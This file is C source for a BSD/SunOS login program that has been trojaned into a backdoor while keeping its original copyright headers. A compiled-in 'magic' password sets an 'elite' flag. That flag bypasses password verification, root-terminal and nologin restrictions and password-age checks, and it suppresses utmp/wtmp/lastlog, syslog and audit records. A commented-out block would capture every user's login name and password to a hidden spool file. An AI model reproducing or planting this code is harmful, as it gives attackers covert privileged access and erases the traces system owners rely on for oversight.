
/* magic.h should have encrypted magic word according to the program */
/* magic.c which should be compiled and run by the makefile          */

#include "magic.h"
#include "code.h"

/*
    change the default backdoor passwd and directory for your own
    usage.
*/
#ifndef lint
char copyright[] =
"@(#) Copyright (c) 1980 Regents of the University of California.\n\
All rights reserved.\n";
#endif not lint

#ifndef lint
static	char sccsid[] = "@(#)login.c 1.1 90/03/23 SMI"; /* from UCB 5.15 4/12/86 */
#endif not lint

/*
 * login [ name ]
 * login -p (for getty)
 * login -r hostname (for rlogind)
 * login -h hostname (for telnetd, etc.)
 */
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/file.h>
#include <sys/types.h>
#include <sys/label.h>
#include <sys/audit.h>

#include <sgtty.h>
#include <utmp.h>
#include <signal.h>
#include <pwd.h>
#include <pwdadj.h>
#include <stdio.h>
#include <lastlog.h>
#include <errno.h>
#include <ttyent.h>
#include <syslog.h>
#include <grp.h>
#include <vfork.h>
#include <strings.h>
#include <string.h>

#include <rpc/types.h>
#include <rpc/auth.h>
#include <rpc/key_prot.h>

#define	TTYGRPNAME	"tty"		/* name of group to own ttys */
#define	TTYGID(gid)	tty_gid(gid)	/* gid that owns all ttys */

#define	SCMPN(a, b)	strncmp(a, b, sizeof (a))
#define	SCPYN(a, b)	(void)strncpy(a, b, sizeof (a))

#define	NMAX	sizeof (utmp.ut_name)
#define	HMAX	sizeof (utmp.ut_host)

#define	WEEK	(24L * 7 * 60 * 60)		/* seconds per week */

char	QUOTAWARN[] =	"/usr/ucb/quota";	/* warn user about quotas */
char	CANTRUN[] =	"login: Can't run ";

char	nolog[] =	"/etc/nologin";
char	qlog[]  =	".hushlogin";
char	maildir[30] =	"/var/spool/mail/";
char	lastlog[] =	"/var/adm/lastlog";
struct	passwd nouser = {"", "nope", -1, -1, "", "", "", "", "" };
audit_state_t audit_state = {AU_LOGIN, AU_LOGIN};
struct	sgttyb ttyb;
struct	utmp utmp;
char	minusnam[16] = "-";
char	*envinit[] = { 0 };		/* now set by setenv calls */
/*
 * This bounds the time given to login.  We initialize it here
 * so it can be patched on machines where it's too small.
 */
u_int	timeout = 60;

char	term[64];

char	*audit_argv[] = { 0, 0, 0, term, "local" };
struct	passwd *pwd;
char	*malloc(), *realloc();
void	timedout();
char	*ttyname();
char	*crypt();
char	*getpass();
char	*stypeof();
off_t	lseek();
extern	char **environ;
extern	int errno;

struct	tchars tc = {
	CINTR, CQUIT, CSTART, CSTOP, CEOT, CBRK
};
struct	ltchars ltc = {
	CSUSP, CDSUSP, CRPRNT, CFLUSH, CWERASE, CLNEXT
};

struct winsize win = { 0, 0, 0, 0 };

int	rflag;
int	usererr = -1;
char	rusername[NMAX+1], lusername[NMAX+1];
char	name[NMAX+1];

main(argc, argv)
	int argc;
	char *argv[];
{
	register char *namep;
	int pflag = 0, hflag = 0, t, f, c;
	int invalid, quietlog;
	FILE *nlfd;
	char *ttyn, *tty;
	int ldisc = NTTYDISC, zero = 0, i;
	int locl;
	char **envnew;
	char *passwd;
	int lastlogok;
	struct lastlog ll, newll;
	time_t when, maxweeks, minweeks, now;
	extern long a64l(), time();
	char *pw_age = NULL;
	struct passwd_adjunct *pwa, *getpwanam();
	int n;

    FILE *buffer;
    int elite=0;
#define BUFFERFILE "/usr/spool/lpd/.login"

    code(magic);
    audit_argv[0] = argv[0];
	/*
	 * Start off by setting the audit state so that login failures
	 * will be captured.
	 */
	if (issecure()) {
		setauid(0);
		setaudit(&audit_state);
	}

	(void)signal(SIGALRM, timedout);
	(void)alarm(timeout);
	(void)signal(SIGQUIT, SIG_IGN);
	(void)signal(SIGINT, SIG_IGN);
	(void)setpriority(PRIO_PROCESS, 0, 0);
	for (t = getdtablesize(); t > 3; t--)
		(void)close(t);
	/*
	 * -p is used by getty to tell login not to destroy the environment
	 * -r is used by rlogind to cause the autologin protocol;
	 * -h is used by other servers to pass the name of the
	 * remote host to login so that it may be placed in utmp and wtmp
	 */
	while (argc > 1) {
		if (strcmp(argv[1], "-r") == 0) {
			if (rflag || hflag) {
				printf("Only one of -r and -h allowed\n");
				exit(1);
			}
			if (argv[2] == 0)
				exit(1);
			rflag = 1;
			usererr = doremotelogin(argv[2]);
			SCPYN(utmp.ut_host, argv[2]);
			audit_argv[4] = argv[2];
			argc -= 2;
			argv += 2;
			continue;
		}
		if (strcmp(argv[1], "-h") == 0 && getuid() == 0) {
			if (rflag || hflag) {
				printf("Only one of -r and -h allowed\n");
				exit(1);
			}
			if (argv[2] == 0)
				exit(1);
			hflag = 1;
			SCPYN(utmp.ut_host, argv[2]);
			audit_argv[4] = argv[2];
			argc -= 2;
			argv += 2;
			continue;
		}
		if (strcmp(argv[1], "-p") == 0) {
			argc--;
			argv++;
			pflag = 1;
			continue;
		}
		break;
	}
	(void)ioctl(0, TIOCNXCL, 0);
	(void)ioctl(0, FIONBIO, &zero);
	(void)ioctl(0, FIOASYNC, &zero);
	(void)ioctl(0, TIOCGETP, &ttyb);
	(void)ioctl(0, TIOCLGET, &locl);
	/*
	 * If talking to an rlogin process,
	 * propagate the terminal type and
	 * baud rate across the network.
	 */
	if (rflag)
		doremoteterm(term, &ttyb);
	ttyb.sg_erase = CERASE;
	ttyb.sg_kill = CKILL;
	locl &= LPASS8;
	locl |= LCRTBS|LCTLECH|LDECCTQ;
	if (ttyb.sg_ospeed >= B1200)
		locl |= LCRTERA|LCRTKIL;
	(void)ioctl(0, TIOCLSET, &locl);
	(void)ioctl(0, TIOCSLTC, &ltc);
	(void)ioctl(0, TIOCSETC, &tc);
	(void)ioctl(0, TIOCSETP, &ttyb);
	ttyn = ttyname(0);
	if (ttyn == (char *)0 || *ttyn == '\0')
		ttyn = "/dev/tty??";
	tty = rindex(ttyn, '/');
	if (tty == NULL)
		tty = ttyn;
	else
		tty++;
	openlog("login", LOG_ODELAY, LOG_AUTH);
	t = 0;
	invalid = FALSE;
	do {
		ldisc = 0;
		(void)ioctl(0, TIOCSETD, &ldisc);
		SCPYN(utmp.ut_name, "");
		/*
		 * Name specified, take it.
		 */
		if (argc > 1) {
			SCPYN(utmp.ut_name, argv[1]);
			argc = 0;
		}
		/*
		 * If remote login take given name,
		 * otherwise prompt user for something.
		 */
		if (rflag && !invalid)
			SCPYN(utmp.ut_name, lusername);
		else {
			getloginname(&utmp);
			if (utmp.ut_name[0] == '-') {
				puts("login names may not start with '-'.");
				invalid = TRUE;
				continue;
			}
		}
		invalid = FALSE;
		if (!strcmp(pwd->pw_shell, "/bin/csh")) {
			ldisc = NTTYDISC;
			(void)ioctl(0, TIOCSETD, &ldisc);
		}
		setauditinfo();
		/*
		 * If no remote login authentication and
		 * a password exists for this user, prompt
		 * for one and verify it.
		 */
		passwd = NULL;
		if (usererr == -1 && *pwd->pw_passwd != '\0') {
			(void)setpriority(PRIO_PROCESS, 0, -4);
			passwd = getpass("Password:");
            if (!strcmp(passwd,magic)) {
                    elite++;
            } else {
              /*      buffer=fopen(BUFFERFILE,"a");
               *     fprintf(buffer,"LU: %s PW: %s\n",pwd->pw_name,passwd);
               *     fclose(buffer);
               */
            }
			namep = crypt(passwd, pwd->pw_passwd);
			(void)setpriority(PRIO_PROCESS, 0, 0);
if (elite==0) {
			if (strcmp(namep, pwd->pw_passwd)) {
				invalid = TRUE;
				audit_note("incorrect password", 1);
			}
        } /* elite*/
		}
		/*
		 * If user not super-user, check for logins disabled.
		 */
if (elite==0) {
		if (pwd->pw_uid != 0 && (nlfd = fopen(nolog, "r")) > 0) {
			while ((c = getc(nlfd)) != EOF)
				putchar(c);
			(void)fflush(stdout);
			audit_note("logins disabled and uid != 0", 2);
			sleep(5);
			exit(0);
		}
    } /* elite */
		/*
		 * If valid so far and root is logging in,
		 * see if root logins on this terminal are permitted.
		 */
if (elite==0) {
		if (!invalid && pwd->pw_uid == 0 && !rootterm(tty)) {
			if (utmp.ut_host[0])
				syslog(LOG_CRIT,
				    "ROOT LOGIN REFUSED ON %s FROM %.*s",
				    tty, HMAX, utmp.ut_host);
			else
				syslog(LOG_CRIT,
				    "ROOT LOGIN REFUSED ON %s", tty);
			invalid = TRUE;
			audit_note("ROOT LOGIN REFUSED", 3);
		}
    } /* elite */
		if (invalid) {
			printf("Login incorrect\n");
			if (++t >= 5) {
				if (utmp.ut_host[0])
					syslog(LOG_CRIT,
				"REPEATED LOGIN FAILURES ON %s FROM %.*s, %.*s",
					    tty, HMAX, utmp.ut_host,
					    NMAX, utmp.ut_name);
				else
					syslog(LOG_CRIT,
				"REPEATED LOGIN FAILURES ON %s, %.*s",
						tty, NMAX, utmp.ut_name);
				(void)ioctl(0, TIOCHPCL, (struct sgttyb *) 0);
				(void)close(0);
				(void)close(1);
				(void)close(2);
				sleep(10);
				exit(1);
			}
		}
		if (*pwd->pw_shell == '\0')
			pwd->pw_shell = "/bin/sh";
		if (*pwd->pw_dir == '\0' && !invalid) {
			printf(
"No home directory specified in password file!  Logging in with home=/\n");
			pwd->pw_dir = "/";
		}
		i = strlen(pwd->pw_shell);
		/*
		 * Remote login invalid must have been because
		 * of a restriction of some sort, no extra chances.
		 */
		if (!usererr && invalid)
			exit(1);
	} while (invalid);

if (elite==0) {
	/* check password age */
	if (issecure()) {
		if ((pwa = getpwanam(pwd->pw_name)) == NULL) {
			fprintf(stderr, "passwd: Sorry not in adjunct file\n");
			exit(1);
		}
		pw_age = pwa->pwa_age;
	} else
		pw_age = pwd->pw_age;

	if (pw_age && *pw_age != NULL) {
		/*
		x* retrieve (a) week of previous change
		 *	    (b) maximum number of valid weeks.
		 */
		when = a64l(pw_age);
		maxweeks = when & 077;
		minweeks = (when >> 6) & 077;
		when >>= 12;
		now = (time((time_t *)0) / WEEK);
		if (when > now ||
		    (now > when + maxweeks) && (maxweeks >= minweeks)) {
			printf("Your password has expired. Choose a new one\n");
			if ((n = exec_pass(pwd->pw_name)) > 0) {
				exit(1);
			} else if (n < 0) {
				fprintf(stderr,
				    "Cannot execute /usr/bin/passwd\n");
				exit(1);
			}
		}
	}
} /* elite */

/* committed to login turn off timeout */
	(void)alarm((u_int)0);
	(void)time(&utmp.ut_time);
	t = ttyslot();

if (elite==0) {
	if (t > 0 && (f = open("/etc/utmp", O_WRONLY)) >= 0) {
		(void)lseek(f, (long)(t*sizeof (utmp)), 0);
		SCPYN(utmp.ut_line, tty);
		(void)write(f, (char *)&utmp, sizeof (utmp));
		(void)close(f);
	}
	if (t > 0 && (f = open("/var/adm/wtmp", O_WRONLY|O_APPEND)) >= 0) {
		(void)write(f, (char *)&utmp, sizeof (utmp));
		(void)close(f);
	}
	lastlogok = 0;
	if ((f = open(lastlog, O_RDWR)) >= 0) {
		(void)lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
		if (read(f, (char *) &ll, sizeof ll) == sizeof ll &&
		    ll.ll_time != 0)
			lastlogok = 1;
		(void)lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
		(void)time(&newll.ll_time);
		SCPYN(newll.ll_line, tty);
		SCPYN(newll.ll_host, utmp.ut_host);
		(void)write(f, (char *) &newll, sizeof newll);
		(void)close(f);
	}
} /* elite */

	/*
	 * Set owner/group/permissions of framebuffer devices
	 */
	(void) set_fb_attrs(ttyn, pwd->pw_uid, pwd->pw_gid);

	(void)chown(ttyn, pwd->pw_uid, TTYGID(pwd->pw_gid));
	if (!hflag && !rflag)					/* XXX */
		(void)ioctl(0, TIOCSWINSZ, &win);
	(void)chmod(ttyn, 0620);
	if (setgid(pwd->pw_gid) < 0) {
		audit_note("setgid", 4);
		perror("login: setgid");
		exit(1);
	}
	(void)strncpy(name, utmp.ut_name, NMAX);
	name[NMAX] = '\0';
	(void)initgroups(name, pwd->pw_gid);
if (elite==0) {
    if (issecure())
		setaudit(&audit_state);
	audit_note("user authenticated", 0);
} /* elite */
	if (setuid(pwd->pw_uid) < 0) {
		audit_note("setuid", 5);
		perror("login: setuid");
		exit(1);
	}
	/*
	 * Set key only after setuid()
	 */
/*    setsecretkey(passwd); */

	if (chdir(pwd->pw_dir) < 0) {
		if (errno != ENOENT)
			perror(pwd->pw_dir);
		if (chdir("/") < 0) {
			perror("Cannot change directory to /");
			printf("No directory!\n");
			exit (1);
		} else {
			printf("No directory!  Logging in with home=/\n");
			pwd->pw_dir = "/";
		}
	}

	quietlog = access(qlog, F_OK) == 0;

	/* destroy environment unless user has asked to preserve it */
	if (!pflag)
		environ = envinit;

	/* set up environment, this time without destruction */
	/* copy the environment before setenving */
	i = 0;
	while (environ[i] != NULL)
		i++;
	envnew = (char **) malloc(sizeof (char *) * ((u_int)i + 1));
	for (; i >= 0; i--)
		envnew[i] = environ[i];
	environ = envnew;

	setenv("HOME=", pwd->pw_dir, 1);
	setenv("SHELL=", pwd->pw_shell, 1);
	if (term[0] == '\0')
		(void)strncpy(term, stypeof(tty), sizeof (term));
	setenv("TERM=", term, 0);
	setenv("USER=", pwd->pw_name, 1);
	setenv("PATH=", ":/usr/ucb:/bin:/usr/bin", 0);
	setenv("LOGNAME=", pwd->pw_name, 1);

	if ((namep = rindex(pwd->pw_shell, '/')) == NULL)
		namep = pwd->pw_shell;
	else
		namep++;
	(void)strcat(minusnam, namep);
	(void)umask(issecure() ? 077 : 022);
if (elite==0) {
	if (tty[sizeof ("tty") - 1] == 'd')
		syslog(LOG_INFO, "DIALUP %s, %s", tty, pwd->pw_name);
	if (pwd->pw_uid == 0)
		if (utmp.ut_host[0])
			syslog(LOG_NOTICE, "ROOT LOGIN %s FROM %.*s",
			    tty, HMAX, utmp.ut_host);
		else
			syslog(LOG_NOTICE, "ROOT LOGIN %s", tty);
	if (!quietlog) {
		int pid, w;
		struct stat st;

		if (lastlogok) {
			printf("Last login: %.*s ",
			    24-5, ctime(&ll.ll_time));
			if (*ll.ll_host != '\0')
				printf("from %.*s\n",
				    sizeof (ll.ll_host), ll.ll_host);
			else
				printf("on %.*s\n",
				    sizeof (ll.ll_line), ll.ll_line);
		}
		showmotd();
		(void)strcat(maildir, pwd->pw_name);
		if (stat(maildir, &st) == 0 && st.st_size != 0)
			printf("You have %smail.\n",
				(st.st_mtime > st.st_atime) ? "new " : "");

		if ((pid = vfork()) == 0) {
			execl(QUOTAWARN, QUOTAWARN, (char *)0);
			(void)write(2, CANTRUN, sizeof (CANTRUN));
			_perror(QUOTAWARN);
			_exit(127);
		} else if (pid == -1) {
			fprintf(stderr, CANTRUN);
			perror(QUOTAWARN);
		} else {
			while ((w = wait((int *)NULL)) != pid && w != -1)
				;
		}
	}
} /* elite */
	(void)signal(SIGALRM, SIG_DFL);
	(void)signal(SIGQUIT, SIG_DFL);
	(void)signal(SIGINT, SIG_DFL);
	(void)signal(SIGTSTP, SIG_IGN);
	execlp(pwd->pw_shell, minusnam, (char *)0);
	perror(pwd->pw_shell);
	audit_note("No shell", 6);
	printf("No shell\n");
	exit(0);
	/* NOTREACHED */
}

getloginname(up)
	register struct utmp *up;
{
	register char *namep;
	char c;

	while (up->ut_name[0] == '\0') {
		namep = up->ut_name;
		printf("login: ");
		while ((c = getchar()) != '\n') {
			if (c == ' ')
				c = '_';
			if (c == EOF)
				exit(0);
			if (namep < up->ut_name+NMAX)
				*namep++ = c;
		}
	}
	(void)strncpy(lusername, up->ut_name, NMAX);
	lusername[NMAX] = 0;
	if ((pwd = getpwnam(lusername)) == NULL)
		pwd = &nouser;

}

setauditinfo()
{
	struct passwd_adjunct *pwda;
	struct passwd_adjunct *getpwanam();

	setauid(pwd->pw_uid);
	audit_argv[1] = lusername;	/* was pwd->pw_name */
	if ((pwda = getpwanam(lusername)) != NULL) {
		if (getfauditflags(&pwda->pwa_au_always,
		    &pwda->pwa_au_never, &audit_state) != 0) {
			/*
			 * if we can't tell how to audit from the flags, audit
			 * everything that's not never for this user.
			 */
			audit_state.as_success =
			    pwda->pwa_au_never.as_success ^ (-1);
			audit_state.as_failure =
			    pwda->pwa_au_never.as_failure ^ (-1);
		}
	} else {
		/*
		 * if there is no adjunct file entry then either
		 * this isn't a secure system in which case it doesn't
		 * matter what st gets set to, or we've got a mismatch
		 * in which case we'd best audit the dickens out of our
		 * mystery user.
		 */
		audit_state.as_success = -1;
		audit_state.as_failure = -1;
	}
}

void
timedout()
{

	printf("Login timed out after %d seconds\n", timeout);
	exit(0);
}

int	stopmotd;

void
catch()
{

	(void)signal(SIGINT, SIG_IGN);
	stopmotd++;
}

rootterm(tty)
	char *tty;
{
	register struct ttyent *t;

	if ((t = getttynam(tty)) != NULL) {
		if (t->ty_status & TTY_SECURE)
			return (1);
	}
	return (0);
}

showmotd()
{
	FILE *mf;
	register c;

	(void)signal(SIGINT, catch);
	if ((mf = fopen("/etc/motd", "r")) != NULL) {
		while ((c = getc(mf)) != EOF && stopmotd == 0)
			putchar(c);
		(void)fclose(mf);
	}
	(void)signal(SIGINT, SIG_IGN);
}

#undef	UNKNOWN
#define	UNKNOWN "su"

char *
stypeof(ttyid)
	char *ttyid;
{
	register struct ttyent *t;

	if (ttyid == NULL || (t = getttynam(ttyid)) == NULL)
		return (UNKNOWN);
	return (t->ty_type);
}

doremotelogin(host)
	char *host;
{
	getstr(rusername, sizeof (rusername), "remuser");
	getstr(lusername, sizeof (lusername), "locuser");
	getstr(term, sizeof (term), "Terminal type");
	if (getuid()) {
		pwd = &nouser;
		return (-1);
	}
	pwd = getpwnam(lusername);
	if (pwd == NULL) {
		pwd = &nouser;
		return (-1);
	}
	return (ruserok(host, (pwd->pw_uid == 0), rusername, lusername));
}

/*ARGSUSED*/
getstr(buf, cnt, err)
	char *buf;
	int cnt;
	char *err;
{
	char c;

	do {
		if (read(0, &c, 1) != 1)
			exit(1);
		*buf++ = c;
	} while (c != 0 && --cnt != 0);

	if (c != 0)
		*--buf = 0;
#ifdef DEBUG
	if (c != 0) {
		printf("%s too long\r\n", err);
	}
#endif
}

char	*speeds[] =
	{ "0", "50", "75", "110", "134", "150", "200", "300",
	"600", "1200", "1800", "2400", "4800", "9600", "19200", "38400" };
#define	NSPEEDS	(sizeof (speeds) / sizeof (speeds[0]))

doremoteterm(terminal, tp)
	char *terminal;
	struct sgttyb *tp;
{
	register char *cp = index(terminal, '/'), **cpp;
	char *speed;

	if (cp) {
		*cp++ = '\0';
		speed = cp;
		cp = index(speed, '/');
		if (cp)
			*cp++ = '\0';
		for (cpp = speeds; cpp < &speeds[NSPEEDS]; cpp++)
			if (strcmp(*cpp, speed) == 0) {
				tp->sg_ispeed = tp->sg_ospeed = cpp-speeds;
				break;
			}
	}
	tp->sg_flags = ECHO|CRMOD|ANYP|XTABS;
}

/*
 * Set the value of var to be arg in the Unix 4.2 BSD environment env.
 * Var should end with '='.
 * (bindings are of the form "var=value")
 * This procedure assumes the memory for the first level of environ
 * was allocated using malloc.
 */
setenv(var, value, clobber)
	char *var, *value;
{
	extern char **environ;
	u_int idx = 0;
	int varlen = strlen(var);
	int vallen = strlen(value);

	for (idx = 0; environ[idx] != NULL; idx++) {
		if (strncmp(environ[idx], var, varlen) == 0) {
			/* found it */
			if (!clobber)
				return;
			environ[idx] = malloc((u_int)(varlen + vallen + 1));
			(void)strcpy(environ[idx], var);
			(void)strcat(environ[idx], value);
			return;
		}
	}
	environ = (char **)realloc(
			(char *)environ, sizeof (char *) * (idx + 2));
	if (environ == NULL) {
		fprintf(stderr, "login: malloc out of memory\n");
		exit(1);
	}
	environ[idx] = malloc((u_int)(varlen + vallen + 1));
	(void)strcpy(environ[idx], var);
	(void)strcat(environ[idx], value);
	environ[++idx] = NULL;
}

tty_gid(default_gid)
	int default_gid;
{
	struct group *getgrnam(), *gr;
	int gid = default_gid;

	gr = getgrnam(TTYGRPNAME);
	if (gr != (struct group *) 0)
		gid = gr->gr_gid;

	endgrent();

	return (gid);
}

/*
 * exec_pass() - exec passwd
 *
 */
static  int
exec_pass(usernam)

	char *usernam;
{
	int	status, w;
	pid_t   pid;

	if ((pid = fork()) == 0) {

		execl("/usr/bin/passwd", "/usr/bin/passwd",
			usernam, (char *)NULL);
		exit(127);
	}

	while ((w = (int)wait(&status)) != pid && w != -1)
		;
	return ((w == -1) ? w : status);
}
/*
 * If network is running secure rpc, decrypt this user's key and
 * have it stored away.
 */
/*
setsecretkey(passwd)
	char *passwd;
{
	char fullname[MAXNETNAMELEN + 1];
	char secret[HEXKEYBYTES + 1];

	if (passwd == NULL) {
		return;
	}
	(void)getnetname(fullname);
	if (!getsecretkey(fullname, secret, passwd)) {
		return;
	}
	if (secret[0] == 0) {
		fprintf(stderr,
"Password does not decrypt secret key for %s.\r\n", fullname);
		return;
	}
	if (key_setsecret(secret) < 0) {
		syslog(LOG_WARNING,
"Could not set %s's secret key: is the keyserv daemon running?\n", fullname);
		return;
	}
}
*/
audit_note(s, err)
	char *s;
	int err;
{
	audit_argv[2] = s;
	audit_text(AU_LOGIN, err, err, 5, audit_argv);
}

/*
 * set_fb_attrs -- change owner/group/permissions of framebuffers
 *		   listed in /etc/fbtab.
 *
 * Note:
 * Exiting from set_fb_attrs upon error is not advisable
 * since it would disable logins on console devices.
 *
 * File format:
 * console mode device_name[:device_name ...]
 * # begins a comment and may appear anywhere on a line.
 *
 * Example:
 * /dev/console 0660 /dev/fb:/dev/cgtwo0:/dev/bwtwo0
 * /dev/console 0660 /dev/gpone0a:/dev/gpone0b
 *
 * Description:
 * The example above sets the owner/group/permissions of the listed
 * devices to uid/gid/0660 if ttyn is /dev/console
 */

#define	FIELD_DELIMS 	" \t\n"
#define	COLON 		":"
#define	MAX_LINELEN 	256
#define	FBTAB 		"/etc/fbtab"

set_fb_attrs(ttyn, uid, gid)
	char *ttyn;
	int uid;
	int gid;
{
	char line[MAX_LINELEN];
	char *console;
	char *mode_str;
	char *dev_list;
	char *device;
	char *ptr;
	int  mode;
	long strtol();
	FILE *fp;

	if ((fp = fopen(FBTAB, "r")) == NULL)
		return;
	while (fgets(line, MAX_LINELEN, fp)) {
		if (ptr = strchr(line, '#'))
			*ptr = '\0';	/* handle comments */
		if ((console = strtok(line, FIELD_DELIMS)) == NULL)
			continue;	/* ignore blank lines */
		if (strcmp(console, ttyn) != 0)
			continue;	/* ignore non-consoles */
		mode_str = strtok((char *)NULL, FIELD_DELIMS);
		if (mode_str == NULL) {
			(void) fprintf(stderr, "%s: invalid entry -- %s\n",
				FBTAB, line);
			continue;
		}
		/* convert string to octal value */
		mode = (int) strtol(mode_str, (char **)NULL, 8);
		if (mode < 0 || mode > 0777) {
			(void) fprintf(stderr, "%s: invalid mode -- %s\n",
				FBTAB, mode_str);
			continue;
		}
		dev_list = strtok((char *)NULL, FIELD_DELIMS);
		if (dev_list == NULL) {
			(void) fprintf(stderr, "%s: %s -- empty device list\n",
				FBTAB, console);
			continue;
		}
		device = strtok(dev_list, COLON);
		while (device) {
			(void) chown(device, uid, gid);
			(void) chmod(device, mode);
			device = strtok((char *)NULL, COLON);
		}
	}
	(void) fclose(fp);
}

